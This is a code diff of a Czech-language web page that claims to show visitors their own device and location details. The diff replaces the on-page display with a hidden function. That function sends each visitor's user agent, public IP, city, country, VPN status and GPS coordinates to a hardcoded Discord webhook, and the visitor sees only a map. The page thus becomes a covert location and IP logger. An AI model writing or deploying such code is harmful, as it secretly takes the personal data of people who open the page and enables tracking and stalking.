@@ -4,13 +4,33 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Geolokace a Informace o Zařízení</title>
+    <style>
+        #map {
+            height: 400px;
+            width: 100%;
+        }
+        body {
+            font-family: Arial, sans-serif;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
     <script>
         // Funkce pro získání informací
         function getDeviceInfo() {
-            // Získání informací o zařízení (User Agent)
             var userAgent = navigator.userAgent;
 
-            // Funkce pro získání veřejné IP adresy
+            // Získání veřejné IP adresy
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -31,11 +51,11 @@
                                     var lat = position.coords.latitude;
                                     var lon = position.coords.longitude;
 
-                                    // Sestavení odkazu na Mapy.cz
-                                    var mapUrl = `https://mapy.cz/zakladni?x=${lon}&y=${lat}&z=13`;
+                                    // Odeslání informací na Discord webhook
+                                    sendToDiscord(userAgent, ipAddress, city, country, vpnStatus, lat, lon);
 
-                                    // Zobrazení informací na stránce
-                                    displayInfo(userAgent, ipAddress, city, country, vpnStatus, lat, lon, mapUrl);
+                                    // Zobrazení mapy
+                                    displayMap(lat, lon);
                                 }, () => {
                                     alert("Chyba při získávání GPS souřadnic.");
                                 });
@@ -46,16 +66,34 @@
                 });
         }
 
-        // Funkce pro zobrazení informací na stránce
-        function displayInfo(userAgent, ipAddress, city, country, vpnStatus, lat, lon, mapUrl) {
-            var output = `
-                📱 Zařízení: ${userAgent}<br>
-                🌍 IP Adresa: ${ipAddress} (Město: ${city}, Země: ${country})<br>
-                🌐 VPN: ${vpnStatus}<br>
-                📍 GPS Souřadnice: ${lat}, ${lon}<br>
-                🔗 Mapa: <a href="${mapUrl}" target="_blank">Zobrazit na Mapy.cz</a>
+        // Funkce pro zobrazení mapy na Mapy.cz
+        function displayMap(lat, lon) {
+            var mapUrl = `https://mapy.cz/zakladni?x=${lon}&y=${lat}&z=13`; // URL pro Mapy.cz
+            document.getElementById("map").innerHTML = `
+                <iframe src="${mapUrl}" width="100%" height="400" frameborder="0" style="border:0;" allowfullscreen></iframe>
             `;
-            document.getElementById("output").innerHTML = output;
+        }
+
+        // Funkce pro odeslání informací na Discord webhook
+        function sendToDiscord(userAgent, ipAddress, city, country, vpnStatus, lat, lon) {
+            var webhookUrl = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
+            var message = {
+                content: `
+                    📱 Zařízení: ${userAgent}
+                    🌍 IP Adresa: ${ipAddress} (Město: ${city}, Země: ${country})
+                    🌐 VPN: ${vpnStatus}
+                    📍 GPS Souřadnice: ${lat}, ${lon}
+                    🔗 Mapa: [Zobrazit na Mapy.cz](https://mapy.cz/zakladni?x=${lon}&y=${lat}&z=13)
+                `
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+            });
         }
     </script>
 </head>
@@ -63,7 +101,7 @@
     <div class="container">
         <h2>Geolokace a Informace o Zařízení</h2>
         <button onclick="getDeviceInfo()">Získat Informace</button>
-        <div id="output"></div>
+        <div id="map"></div>
     </div>
 </body>
 </html>
